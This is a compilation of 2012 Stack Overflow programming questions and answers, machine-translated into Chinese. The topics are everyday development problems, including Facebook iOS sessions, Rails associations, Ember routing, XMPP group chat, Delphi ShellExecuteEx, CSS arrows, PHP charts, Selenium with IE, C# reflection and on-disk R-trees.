        [alertView show];
    }
}

/*
 * Opens a Facebook session and optionally shows the login UX.
 */
- (BOOL)openSessionWithAllowLoginUI:(BOOL)allowLoginUI {
    NSArray *permissions = [[NSArray alloc] initWithObjects:
                            @"email",
                            @"user_likes",
                            nil];
    return [FBSession openActiveSessionWithReadPermissions:permissions
                                              allowLoginUI:allowLoginUI
                                         completionHandler:^(FBSession *session,
                                                             FBSessionState state,
                                                             NSError *error) {
                                             [self sessionStateChanged:session
                                                                 state:state
                                                                 error:error];
                                         }];
}
- (void)openSession
{
    [FBSession openActiveSessionWithReadPermissions:nil
                                       allowLoginUI:YES
                                  completionHandler:
     ^(FBSession *session,
       FBSessionState state, NSError *error) {
         [self sessionStateChanged:session state:state error:error];
     }];
} 
```

3.在您的应用程序delegate.h中添加以下代码

```
- (BOOL)openSessionWithAllowLoginUI:(BOOL)allowLoginUI; 
```

4.last 在需要时调用此委托

```
navAppDelegate* appDelegate = [UIApplication sharedApplication].delegate;
[appDelegate openSessionWithAllowLoginUI:YES]; 
```

# android - 将短信数据写入串口

> ID：13599518
> 
> 赞同：0
> 
> 时间：2012-11-28T06:59:44.617
> 
> 标签：android, vb.net, jakarta-ee

我已经建立了一个在手机开机时运行的 SMS 服务。此服务在收到 SMS 时更新数据库，然后在日志文件中创建一个条目。最后，短信被删除。我希望我的系统能够在 Android 手机和 PC 之间同步数据库。为此，我想在 Android 设备所连接的串行端口上发送/接收数据。在Android中可以这样做吗？实现同步机制的最佳方式是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:20:13.467

所以你想使用电话中的调制解调器？或者你只是想从 Android SMS 应用程序中获取所有的短信？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T20:08:02.013

您的主要问题似乎是与 android 应用程序的通信。通过 USB 连接。之前已经在 SO 上问过这个问题：

[Android 应用程序，与插入 USB 端口的设备通信](https://stackoverflow.com/questions/3803871/android-apps-communicating-with-a-device-plugged-in-the-usb-port)

这个[链接](http://www.anothem.net/archives/2010/10/15/android-usb-connection-to-pc/)也可能有用。

您可以轻松地在 USB 端口上为您的 Android 应用程序和桌面应用程序建立一个通道以进行通信，从而开发您自己的同步机制。但是，如果您选择某些方法，这可能会限制您使用 USB 连接。基于 Socket 的方法的优点是它可以轻松移植到远程无线连接，使您的同步机制也可以在 WiFi 上工作。

# ruby-on-rails-3 - Rails：如何在构建之前添加或插入关联？

> ID：13599519
> 
> 赞同：0
> 
> 时间：2012-11-28T06:59:46.503
> 
> 标签：ruby-on-rails-3, associations

我仍在努力寻找在 Rails 中设置关联的适当方法。我终于推断我希望模型完成大部分工作。我的基本模型相当简单。我有一个书籍模型、一个奖项模型和一个将两者联系起来的 book_awards 模型。我想从图书模型创建 book_awards。

```
class Book < ActiveRecord::Base
  has_many :book_awards, :inverse_of :book
  has_many :awards, :through => :book_awards
end 
```

当我处理一本新书时，建立可能的奖项列表非常容易。它看起来像这样：（在每种情况下`award_list`都传入 as `Award.some_scope`）

```
def build_book_awards(award_list)
  award_list.each do |award|
      book_awards.build(:award => award)
  end
end 
```

但是，在处理现有书籍时，我需要检查关联是否已经存在。一个相当简单的方法是这样的：

```
def build_book_awards(award_list)
  award_list.each do |award|
    book_rewards.build(:award => award) if book_awards.find{|s| s.award == award}.nil?
  end
end 
```

问题是这不会按奖励顺序列出奖项。相反，它将首先列出现有的 book_awards，然后是该书尚未获得的奖项。出于纯粹的审美原因，我觉得这很可怕。我希望每次都以相同的顺序列出关联。

接下来我想出了以下代码。这会按顺序列出内容，并且在编辑页面上看起来很漂亮，但是如果用户不继续更新，它会删除任何现有的关联，这会带来不可接受的副作用。

```
def build_book_awards(award_list)
  current = book_awards.clone
  book_awards.clear
  award_list.each do |award|
    book_award = current.find{|s| s.award == award}
    if book_award
      book_awards.push(book_award)
    else
      book_awards.build(:book => book)
    end
  end
end 
```

我心中的问题是 build 创建了一个关联并将其附加到关联列表的末尾。我需要一种方法来构建它，然后将它插入到我想要的任何地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-30T01:43:11.577

如果其他人有兴趣，这样的事情就奏效了。在我真正的应用程序中，我继续让它更通用。

```
def build_book_awards(award_list)
  award_list.each_with_index do |award, idx|
    unless index = book_awards.find_index{|s| s.award == award}
      event_awards.build(:award_id => award.id)
      index = -1
    end
    book_awards.insert(idx, book_awards.delete_at(index))
  end
end 
```

我仍然觉得我错过了一些东西，因为这对我来说似乎太有用了，不能以某种方式包含在内。

# ember.js - EmberJS 可以支持子状态的默认加载吗

> ID：13599521
> 
> 赞同：0
> 
> 时间：2012-11-28T06:59:50.790
> 
> 标签：ember.js, ember-old-router

我有状态

mysite.com/#/index 这是初始化时加载的默认页面

还有其他子路由 mysite.com/#/about mysite.com/#/contact

如果有人键入 mysite.com/#/about 我可以控制 substate about 的加载吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T09:54:19.367

只要您在路由器中定义了路由 (URL)，Ember 路由器就会自动执行此操作。

当输入 URL mysite.com/#/about 时，如下所示的内容将自动导航到正确的状态。如果您想控制进入和退出该状态时发生的情况，请在 enter() 和 exit() 函数中指定它。

```
App.router = Ember.Router.create({
    enableLogging: true,
    //location: 'history',
    root: Ember.Route.extend({
        home: Ember.Route.extend({
            route: '/',
            redirectsTo: 'index'
        }),
        index: Ember.Route.extend({
            route: '/index',
            connectOutlets: function (router) {
                router.get('applicationController').connectOutlet('index');
            }
        }),
        about: Ember.Route.extend({
            route: '/about',

            enter: function() {
                //stuff
            }

            exit: function() {
                //stuff
            }

            connectOutlets: function (router) {
                router.get('applicationController').connectOutlet('about',);
            }
        })
    })
}); 
```

# javascript - Google 翻译中 div 的单击或 mouseup 事件

> ID：13599526
> 
> 赞同：2
> 
> 时间：2012-11-28T07:00:32.987
> 
> 标签：javascript, javascript-events

我正在编写一个 Javascript 小书签来为[Google Translate](http://translate.google.com/)创建一个快捷方式。例如，键入 'ESC' 或 '\' 将[清除 TextArea](https://dl.dropbox.com/u/29920876/google%20Translate/googleTranslateShortcut.html)。现在我想添加一个快捷方式，当输入“]”时，它会交换翻译语言；和“/”将发音文本。

每个都包裹在`div#gt-lang-swap`和中`div#gt-src-listen`。但我无法在控制台中触发这些事件。

我试过了：

```
document.getElementById("gt-lang-swap").click() 
```

但什么也没有发生。这也不起作用：

```
e = document.createEvent("MouseEvents")
e.initMouseEvent("mouseup", true, true, window, 1, 0, 0, 0, 0,
    false, false, false, false, 1, null)
document.getElementById('gt-src-listen').dispatchEvent(e) 
```

有没有人有任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-27T04:24:27.277

我也无法在该按钮上触发点击事件，但我认为您不需要这样做，因为您只需修改 URL，UI 就会相应更新：

```
var components = window.location.hash.substr(1).split('/');
window.location = '#' + components[1] + '/' + components[0] + '/' + components[2];
document.getElementById('source').select(); // optionally focus user back into source field 
```

因此，例如，如果 url 是`#es/en/hola%20amigo`，则此代码交换前两个语言键，因此变为`#en/es/hola%20amigo`.

我想你甚至可以`document.getElementById('result_box')`用来抓取翻译后的文本并将其放入源字段！

如果您更新您的扩展程序，请告诉我，我很乐意使用它。

编辑：刚刚意识到这个问题已经有将近两年的历史了。希望有人觉得它有用:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:19:45.633

你试过`onclick`而不是 just`click`吗？

```
document.getElementById("gt-lang-swap").onclick=function(){

   console.log('clicked it');

   //Other stuff that should happen...
} 
```

或者，尝试创建一个函数来触发事件（该函数取自[此处](http://jehiah.cz/a/firing-javascript-events-properly)）

```
function fireEvent(element,event){
    if (document.createEventObject){
       // dispatch for IE
       var evt = document.createEventObject();
       return element.fireEvent('on'+event,evt)
    }
    else{
       // dispatch for firefox + others
       var evt = document.createEvent("HTMLEvents");
       evt.initEvent(event, true, true ); // event type,bubbling,cancelable
       return !element.dispatchEvent(evt);
    }
} 
```

其次是：

```
<input type="text" id="test">
<script>
   obj = document.getElementById("test");
   Event.observe(obj,'change',function(){alert('hi');});
   fireEvent(obj,'change');
</script> 
```

应该做的伎俩...

注意：正如评论和链接文章中提到的，这个答案有[原型](http://prototypejs.org/)库的先决条件......因此它可能不是（经过讨论）这个问题的理想答案。

看[这里](http://www.w3schools.com/jsref/event_onclick.asp)了解更多

# android - 在 XMPP 服务器上创建组

> ID：13599529
> 
> 赞同：1
> 
> 时间：2012-11-28T07:00:42.963
> 
> 标签：android, xmpp, openfire, smack

我正在使用 xmpp/openfire 制作一个聊天应用程序，我想在服务器上创建组，服务器上**的任何人都**可以加入。

任何人都请帮助我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-04-07T11:28:31.973

像这样你可以在 Xmpp 服务器中创建组

```
 SmackAndroid.init(SelectMembers.this);
            MultiUserChat muc = new MultiUserChat(xconnection, GroupName
                    + "@conference.fonechat.in");
            muc.create(my_number);
            setConfig(muc);
            muc = new MultiUserChat(xconnection, GroupName + "@conference.serverid");
            muc.join(my_number);
            for (int i = 0; i < name.size(); i++) {
                muc.invite(phone.get(i).toString() + "@fonechat.in",
                        "Meet me in this excellent room"); 
```

//设置配置函数

```
 private void setConfig(MultiUserChat multiUserChat) {

    try {
        Form form = multiUserChat.getConfigurationForm();
        Form submitForm = form.createAnswerForm();
        for (Iterator<FormField> fields = submitForm.getFields(); fields
                .hasNext();) {
            FormField field = (FormField) fields.next();
            if (!FormField.TYPE_HIDDEN.equals(field.getType())
                    && field.getVariable() != null) {
                submitForm.setDefaultAnswer(field.getVariable());
            }
        }
        submitForm.setAnswer("muc#roomconfig_publicroom", true);
        submitForm.setAnswer("muc#roomconfig_persistentroom", true);
        multiUserChat.sendConfigurationForm(submitForm);
    } catch (Exception e) {
        e.printStackTrace();
    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-16T09:39:46.560

试试 QuickBlox.com 他们也有一个示例程序..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-09T22:48:04.860

尝试为每个组创建一个持久的多用户聊天室（MUC：http: [//xmpp.org/extensions/xep-0045.html ）。](http://xmpp.org/extensions/xep-0045.html)您将能够向组中的每个人发送消息，这非常有用。

# delphi - 如何通过 ShellExecuteEx 打开字体文件？

> ID：13599532
> 
> 赞同：1
> 
> 时间：2012-11-28T07:00:43.447
> 
> 标签：delphi, windows-shell

我得到一个名为的字体文件的绝对 PIDL `FontPIDL`

我用这段代码打开它： var SheExeInfo : SHELLEXECUTEINFO;

```
begin
    ZeroMemory(@ShExeInfo, SizeOf(ShExeInfo));

    ShExeInfo.cbSize := SizeOf(ShExeInfo);
    ShExeInfo.lpVerb := 'Open';
    ShExeInfo.lpIDList := FontPIDL;
    ShExeInfo.nShow := SW_SHOWNORMAL;
    ShExeInfo.fMask := SEE_MASK_IDLIST;
end; 
```

得到一个错误：`The parameter is incorrect`

我想知道如何解决它？是我想念的一些参数吗？

**更新 ：**

我如何获得字体文件绝对 PIDL：

```
var
  psfDeskTop : IShellFolder;
  psfFont : IShellFolder;
  pEnumList : IEnumIdList;
  pidFont : PItemIdList;
  pidChild : PItemIdList;
  pidAbFont : PItemIdList; 
  FontPath : array[0..MAX_PATH - 1] of Char;
  pchEaten, dwAttributes, ItemsFetched : ULONG;

begin
  FillChar(FontPath, sizeof(FontPath), #0);
  SHGetSpecialFolderPath(0, FontPath, CSIDL_FONTS, False);
  SHGetDesktopFolder(psfDeskTop);
  psfDeskTop.ParseDisplayName(0, nil, FontPath, pchEaten, pidFont,
    dwAttributes);
  psfDeskTop.BindToObject(pidFont, nil, IID_IShellFolder, psfFont);
  psfFont.EnumObjects(0, SHCONTF_FOLDERS or SHCONTF_NONFOLDERS or
    SHCONTF_INCLUDEHIDDEN, pEnumList);
  ItemsFetched := 0;
  while pEnumList.Next(1, pidChild, ItemsFetched) = NO_ERROR do
  begin
    pidAbFont := ILCombine(pidFont , pidChild);
    ///... do something
  end;

end; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T19:34:04.703

Remove the `ShExeInfo.lpVerb := 'Open';` statement works, but nobody else has said why it works. The reason is because font files do not have an `"Open"` verb registered by default. By leaving the `lpVerb` set to `nil`, you allow `ShellExecuteEx()` to execute the actual default verb for the file type, whatever it happens to be. According to [the documentation](http://msdn.microsoft.com/en-us/library/windows/desktop/bb759784.aspx):

> lpVerb
> 
> Type: LPCTSTR
> 
> A string, referred to as a verb, that specifies the action to be performed. The set of available verbs depends on the particular file or folder. Generally, the actions available from an object's shortcut menu are available verbs. **This parameter can be NULL, in which case the default verb is used if available. If not, the "open" verb is used. If neither verb is available, the system uses the first verb listed in the registry.**

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-28T09:11:07.927

省略`lpVerb`赋值使代码工作：

```
begin
    ZeroMemory(@ShExeInfo, SizeOf(ShExeInfo));
    ShExeInfo.cbSize := SizeOf(ShExeInfo);
    // ShExeInfo.lpVerb := 'Open'; will be fail . 
    // use ShExeInfo.lpVerb := '' or ZeroMemory(@ShExeInfo, SizeOf(ShExeInfo)); before
    ShExeInfo.lpIDList := FontPIDL;
    ShExeInfo.nShow := SW_SHOWNORMAL;
    ShExeInfo.fMask := SEE_MASK_IDLIST;
end; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T07:37:36.083

我给你做了一个样品：

```
var
    ShExeInfo: TShellExecuteInfo;
    ExecuteFile: string;
begin
    ZeroMemory(@ShExeInfo, SizeOf(ShExeInfo));
    ExecuteFile:='D:\SoftWare\font\BDavat.ttf';
    FillChar(ShExeInfo, SizeOf(ShExeInfo), 0) ;
    ShExeInfo.cbSize := SizeOf(TShellExecuteInfo) ;
    with ShExeInfo do
    begin
      //lpVerb := 'Open';
      fMask := SEE_MASK_NOCLOSEPROCESS;
      Wnd := Application.Handle;
      lpFile := PWideChar(ExecuteFile) ;
      nShow := SW_SHOWNORMAL;
    end;
    ShellExecuteEx(@ShExeInfo) ;
end; 
```

获取它们的路径的功能：

```
uses
  ShlObj, ActiveX;

const
  CSIDL_FLAG_CREATE = $8000;
  CSIDL_ADMINTOOLS = $0030;
  CSIDL_ALTSTARTUP = $001D;
  CSIDL_APPDATA = $001A;
  CSIDL_BITBUCKET = $000A;
  CSIDL_CDBURN_AREA = $003B;
  CSIDL_COMMON_ADMINTOOLS = $002F;
  CSIDL_COMMON_ALTSTARTUP = $001E;
  CSIDL_COMMON_APPDATA = $0023;
  CSIDL_COMMON_DESKTOPDIRECTORY = $0019;
  CSIDL_COMMON_DOCUMENTS = $002E;
  CSIDL_COMMON_FAVORITES = $001F;
  CSIDL_COMMON_MUSIC = $0035;
  CSIDL_COMMON_PICTURES = $0036;
  CSIDL_COMMON_PROGRAMS = $0017;
  CSIDL_COMMON_STARTMENU = $0016;
  CSIDL_COMMON_STARTUP = $0018;
  CSIDL_COMMON_TEMPLATES = $002D;
  CSIDL_COMMON_VIDEO = $0037;
  CSIDL_CONTROLS = $0003;
  CSIDL_COOKIES = $0021;
  CSIDL_DESKTOP = $0000;
  CSIDL_DESKTOPDIRECTORY = $0010;
  CSIDL_DRIVES = $0011;
  CSIDL_FAVORITES = $0006;
  CSIDL_FONTS  = $0014;
  CSIDL_HISTORY = $0022;
  CSIDL_INTERNET = $0001;
  CSIDL_INTERNET_CACHE = $0020;
  CSIDL_LOCAL_APPDATA = $001C;
  CSIDL_MYDOCUMENTS = $000C;
  CSIDL_MYMUSIC = $000D;
  CSIDL_MYPICTURES = $0027;
  CSIDL_MYVIDEO = $000E;
  CSIDL_NETHOOD = $0013;
  CSIDL_NETWORK = $0012;
  CSIDL_PERSONAL = $0005;
  CSIDL_PRINTERS = $0004;
  CSIDL_PRINTHOOD = $001B;
  CSIDL_PROFILE = $0028;
  CSIDL_PROFILES = $003E;
  CSIDL_PROGRAM_FILES = $0026;
  CSIDL_PROGRAM_FILES_COMMON = $002B;
  CSIDL_PROGRAMS = $0002;
  CSIDL_RECENT = $0008;
  CSIDL_SENDTO = $0009;
  CSIDL_STARTMENU = $000B;
  CSIDL_STARTUP = $0007;
  CSIDL_SYSTEM = $0025;
  CSIDL_TEMPLATES = $0015;
  CSIDL_WINDOWS = $0024;

function GetShellFolder(CSIDL: integer): string;
var
  pidl                   : PItemIdList;
  FolderPath             : string;
  SystemFolder           : Integer;
  Malloc                 : IMalloc;
begin
  Malloc := nil;
  FolderPath := '';
  SHGetMalloc(Malloc);
  if Malloc = nil then
  begin
    Result := FolderPath;
    Exit;
  end;
  try
    SystemFolder := CSIDL;
    if SUCCEEDED(SHGetSpecialFolderLocation(0, SystemFolder, pidl)) then
    begin
      SetLength(FolderPath, max_path);
      if SHGetPathFromIDList(pidl, PChar(FolderPath)) then
      begin
        SetLength(FolderPath, length(PChar(FolderPath)));
      end;
    end;
    Result := FolderPath;
  finally
    Malloc.Free(pidl);
  end;
end; 
```

如何使用：

```
ShowMessage(GetShellFolder(CSIDL_FONTS)); 
```

测试一下，希望对你有帮助...

# html - 将css箭头添加到绝对位置的ul

> ID：13599533
> 
> 赞同：2
> 
> 时间：2012-11-28T07:00:44.860
> 
> 标签：html, css

我正在尝试在我的 中添加一个箭头`ul`，问题是`ul`我`position: absolute;`总是`position: relative;`在`ul`. 有人有想法吗？

编辑：忘了提，箭​​头在上面。像[这样](http://cssarrowplease.com/)

Jsfiddle：[演示](http://jsfiddle.net/yucs5/1/)

```
<div id="con">
    <ul id="links">
        <li><a href="#">Link1</a></li>
        <li><a href="#">Link2</a></li>
        <li><a href="#">Link3</a></li>
    </ul>
</div>​

#con {
    margin: 20px;
    padding: 20px;
    width: 300px;
    height: 200px;
    position: relative;
}

#con #links {
    position: absolute;
    background-color: aqua;   
}

#con #links li {
    padding: 10px;
} 
```

​</p>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:10:35.733

尝试这个

CSS

```
 #con #links:before{
    content:'';
    width:0px; height:0px;
    position:absolute;left:50%; top:-20px; 
    margin-left:-10px;
    border:10px solid;
    border-color: transparent transparent rgba(0,0,4,0.8) transparent;
} 
```

**[演示](http://jsfiddle.net/yucs5/10/)** ​</p>

# php - 图像“http://localhost/chart/graph.php”无法显示，因为它在 PHPGraphLib 中包含错误

> ID：13599534
> 
> 赞同：2
> 
> 时间：2012-11-28T07:00:45.437
> 
> 标签：php, mysql, printf, phpgraphlib

我的 PHP 不太好，我的代码可能有什么问题？请！帮助。这是我显示图表的代码：

功能显示图（$输入）{

```
$dataArray1 = array();
$dataArray2 = array();

//get data from database
$sql = sprintf("SELECT target_date, high, low FROM metal_price WHERE metal_kind ='%s' and metal_cd ='%s' and target_date BETWEEN '%s' and '%s' order by target_date", 
                $input["kind"], $input["cd"], 
                $input["date_from_y"]."/".$input["date_from_m"]."/".$input["date_from_d"], 
                $input["date_to_y"]."/".$input["date_to_m"]."/".$input["date_to_d"]);

$result = mysql_query($sql) or die('Query failed: ' . mysql_error());
if ($result) {
    while ($row = mysql_fetch_assoc($result)) {
        $target_date=$row["target_date"];
        $high=$row["high"];
        $low=$row["low"];

        //add to data array
        $dataArray1[$target_date]=$high;
        $dataArray2[$target_date]=$low;
    }
}

$graph->addData($dataArray1);
$graph->addData($dataArray2);
$graph->setTitle('Metal Price Chart');
$graph->setBars(false);
$graph->setLine(true);
$graph->setLineColor('blue', 'green');
$graph->setDataPoints(true);
$graph->setDataPointColor('maroon');
$graph->setDataValues(true);
$graph->setDataValueColor('maroon');
$graph->setLegend(true);
$graph->setTitleLocation('center');
$graph->setTitleColor('blue');
$graph->setLegendOutlineColor('white');
$graph->setLegendTitle('High', 'Low');
$graph->setGoalLineColor('blue', 'green');
$graph->setXValuesHorizontal(true);
$graph->createGraph(); 
```

}

每次运行代码时都会收到此错误：无法显示图像“http://localhost/chart/graph.php”，因为它包含错误

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-13T02:36:44.340

别忘了写 `include('phpgraphlib.php'); $graph = new PHPGraphLib(500,350);` 之前 `$dataArray1 = array(); $dataArray2 = array();`

# ruby - 无法在 IE9 浏览器上运行 Selenium Ruby Webdriver

> ID：13599537
> 
> 赞同：1
> 
> 时间：2012-11-28T07:01:06.177
> 
> 标签：ruby, internet-explorer, selenium, webdriver, selenium-webdriver

尝试在 IE9 浏览器上运行 Selenium Ruby Webdriver 脚本时出现以下错误，浏览器未启动并显示以下错误：

```
 Selenium::WebDriver::Error::WebDriverError: Unable to find standalone executable
  . Please download the IEDriverServer from http://code.google.com/p/selenium/down
  loads/list and place the executable on your PATH.

 Below are lines of code that I have tried:

  browser=Selenium::WebDriver.for :ie
  @driver.get CONFIG['url'] 
```

如果我需要在这种情况下执行更多步骤以便能够使用 Ruby Selenium Webdriver 在 IE9 浏览器上运行脚本，请指导我。非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:14:26.577

我认为错误日志是不言自明的。今后 IEDriver 必须单独下载，就像您现在为 chromedriver 所做的那样。作者[在这里](http://jimevansmusic.blogspot.in/2012_11_01_archive.html)做了一个很好的解释。您可以从错误日志中的链接下载驱动程序 zip 并将其添加到您的 PATH。阅读更多[@IEDriver](http://code.google.com/p/selenium/wiki/InternetExplorerDriver)

# ios - MPMoviePlayerViewController 继续播放不同的视频

> ID：13599539
> 
> 赞同：0
> 
> 时间：2012-11-28T07:01:15.553
> 
> 标签：ios, mpmovieplayercontroller, mpmovieplayer

我有 3 个不同的视频：video1、video2、video3

我想当video1播放结束然后继续播放video2然后继续播放video3然后完成

这是我当前的代码：

```
moviePlayerViewController = [[MPMoviePlayerViewController alloc] init];
moviePlayerViewController.moviePlayer.contentURL = [NSURL URLWithString:video1];
[self.navigationController presentMoviePlayerViewControllerAnimated:moviePlayerViewController]; 
```

我想也许我应该使用

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(playbackFinishedCallback:)
                                             name:MPMoviePlayerLoadStateDidChangeNotification
                                           object:moviePlayerViewController.moviePlayer]; 
```

但是当 video1 播放完成时，navigationController 关闭

我应该如何解决它，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:08:48.687

您可以`AVQueuePlayer`用于对视频进行排队。

# c# - 如何从 C# 中的函数指针获取函数名？

> ID：13599544
> 
> 赞同：5
> 
> 时间：2012-11-28T07:01:23.337
> 
> 标签：c#, reflection, function-pointers

我有一个函数，它需要一个函数指针

喜欢

```
public void myfunc<a,b>(Func<a,b> functionpointer)
{
  String functionname;
  // Do some magic to get functionpointers name and set it to functionname
 } 
```

是否可以在不运行的情况下获取函数的名称？

我知道你可以得到当前正在运行的函数的函数名，但是你如何得到你要调用的函数的名字呢？

如果之前可能已经发布过这样的问题，请原谅我，我在 C# 中找不到解决方案

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-28T07:03:44.543

您可以使用[MemberInfo.Name 属性](http://msdn.microsoft.com/en-us/library/system.reflection.memberinfo.name.aspx)

```
string functionname = functionpointer.Method.Name; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:11:34.673

使用反射

```
 foreach (Type objType in assembly.GetTypes())
                {
                    //List<string> listInner = new List<string>();
                    var listInner = new HashSet<string>();
                    listInner.Add(objType.FullName);
                    foreach (MemberInfo obMember in objType.GetMembers())
                    {
                        listInner.Add(obMember.MemberType + " " + obMember.ToString());

                    }
                 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:07:48.657

```
public void myfunc<a, b>(Expression<Func<a, b>> expr)
{
    Func<a, b> functionpointer = expr.Compile();

    String functionname = "";
    var mce = expr.Body as MethodCallExpression;
    if(mce!=null)
    {
        functionname = mce.Method.Name;
    }
} 
```

# mysql - 空的post slug有用吗？

> ID：13599545
> 
> 赞同：1
> 
> 时间：2012-11-28T07:01:36.553
> 
> 标签：mysql, wordpress

在我的 WordPress 博客中，由于旧帖子 slug，我遇到了一些问题**，**因此我在 MySQL 中搜索并删除了旧帖子 slug，但数据库中有很多**空的旧帖子 slug**，我不知道它们。所以我真正的问题是**“我可以删除空的旧帖子吗？如果我删除它们有什么害处吗？”**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-01T05:12:50.130

正如 Jan Dvorak 在评论中提到的，我测试并删除了所有空的`wp_old_slugs`，一切看起来都很好。

但是我肯定不知道为什么这些蛞蝓是空的？

# stored-procedures - 存储过程参数错误

> ID：13599549
> 
> 赞同：0
> 
> 时间：2012-11-28T07:01:46.400
> 
> 标签：stored-procedures

我创建了一个简单的存储过程，如下所示：

```
Alter Proc dbo.s5 
(
  @id int = 14,
  @Salary int output
)
As
Begin
  --Declare @Salary int
  set @Salary = (select Salary
                 from dbo.EmpInf
                 where EmpId = @id)
  print @Salary
  --Return @Salary
End 
```

在执行此存储过程期间，我收到此错误：

> *消息 201，级别 16，状态 4，过程 s5，第 0 行
> 过程或函数“s5”需要参数“@Salary”，但未提供该参数。*

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:06:40.540

您需要将@Salary 变量作为输入变量提供给您的存储过程，即使它被标记为输出参数。

```
exec dbo.s5 @id, @salary 
```

可以在以下[链接](http://msdn.microsoft.com/en-us/library/ms187004%28v=sql.105%29.aspx)中阅读：

> 执行存储过程时，也可以为 OUTPUT 参数指定输入值。这允许存储过程从调用程序接收一个值，对其进行更改或对其执行操作，然后将新值返回给调用程序。...这通常被称为“通过引用的能力。

# android - 如何将样式应用于我拥有的所有 TextView？

> ID：13599553
> 
> 赞同：5
> 
> 时间：2012-11-28T07:01:53.770
> 
> 标签：android, textview, themes

> **可能重复：**
> [在不向每个 TextView 添加样式属性的情况下对所有 TextView（或自定义视图）进行样式设置](https://stackoverflow.com/questions/6801890/styling-all-textviewsor-custom-view-without-adding-the-style-attribute-to-ever)

我的应用程序中有很多`TextView`s。`android:shadowColor`它们有各种字体大小、颜色等。我需要应用`android:shadowRadius`它们以使它们都带有阴影。怎么做？

例如，我可以为`TextView`s 制作具有必要属性的样式

```
<style name="text_views">
    <item name="android:shadowColor">@color/tv_shadow</item>
    <item name="android:shadowDy">1</item>
    <item name="android:shadowRadius">0.7</item>
</style> 
```

并将其应用于每个`TextView`. 是否可以在应用程序的主题中包含阴影属性？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-28T07:09:52.573

是的。

你需要做的是创建一个

```
<style name="Theme.RedPlanetTheme" parent="android:Theme">
    <item name="android:shadowColor">@color/tv_shadow</item>
    <item name="android:shadowDy">1</item>
    <item name="android:shadowRadius">0.7</item>
</style> 
```

然后在你的清单中你会这样做。

```
<application
        android:debuggable="true"
        android:icon="@drawable/icon"
        android:label="Red Planet App"
        android:theme="@style/Theme.RedPlanetTheme" > 
```

## 这将允许您的整个应用程序继承您的自定义主题样式。

编辑

如果您只想应用到 textview，那么我们只需要再自定义一下 ThemeRedPlanet。

```
<style name="Theme.RedPlanetTheme" parent="android:Theme">    
    <item name="android:textAppearance">@style/MyRedTextAppearance</item>
</style>

<style name="MyRedTextAppearance" parent="@android:style/TextAppearance">
    <item name="android:shadowColor">@color/tv_shadow</item>
    <item name="android:shadowDy">1</item>
    <item name="android:shadowRadius">0.7</item>
</style> 
```

[我用这个作为例子。Steve Pomeroy 更直接地应用全球主题（设置一次有点交易）](https://stackoverflow.com/questions/3078081/setting-global-styles-for-views-in-android)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-28T07:09:51.463

请将以下行添加到您的 textview 属性中，它将解决您的问题。

`style="@style/text_views"`

# ajax - 如何获取 Ajax div 内容？

> ID：13599556
> 
> 赞同：1
> 
> 时间：2012-11-28T07:02:13.103
> 
> 标签：ajax, vbscript

```
Dim objWshShell,IE,searchStr
Set objWshShell = Wscript.CreateObject("Wscript.Shell")
Set IE = CreateObject("InternetExplorer.Application")
With IE
  .Visible = true
  .Navigate "http://site"
  Do While .Busy
    WScript.Sleep 100
  Loop
.....
.....
End With 
```

如何获取内容，`<div id="ajax_div"></div>`因为没有在页面源代码中显示代码。

# c# - 持久（基于磁盘）R-Tree（或 R* 树）

> ID：13599557
> 
> 赞同：5
> 
> 时间：2012-11-28T07:02:31.187
> 
> 标签：c#, java, gis, geospatial, r-tree

如何将 R* 树实现为持久（基于磁盘）的树？保存 R* 树索引或保存叶值的文件架构是什么？

注释：此外，如何在这样的持久性 R* 树中执行插入、更新和删除操作？

注释 II：我已经实现了一个具有批量加载功能的内存 R-Tree。但我认为当我们谈论基于磁盘的磁盘时，这完全无关紧要。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-02T10:59:46.320

# 文件架构

好吧，它是页面（= 块）。这些页面应该是底层存储页面大小的倍数，因此可能是 1kb 或 8kb 块。每个块都有一个编号，可以通过这种方式引用。

目录页面存储孩子的边界框及其页码。

子页面存储实际的数据对象。

# 管理树

好吧，理论上：每当您修改内存中的页面时，都会将更改写入磁盘。就是这样。

在实践中，您可能希望使用缓存来提高性能，并且您可能希望拥有事务以在应用程序崩溃的情况下保持树的一致性。

关于这两件事，您可以在 RDBMS 体系结构领域找到大量文献。

R*-tree 的一个主要优点是它是一个常规的面向页面的树，就像您在任何地方的数据库系统中都有它们一样。如果你有一个好的磁盘 B+-tree 实现，你可以为 R*-tree*重用你的大部分代码*。

# 如何开始

要开始使用，您需要习惯基于磁盘的数据索引，就像在经典 RDBMS 中所做的那样。我建议从**磁盘**B-tree 或 B+-tree 开始。允许删除，因为您需要考虑管理已删除的页面以及所有这些。

一旦你弄清楚了磁盘上的 B-Tree（可能会花一些时间优化它！），做一个磁盘上的 R-tree 应该是相当明显的。

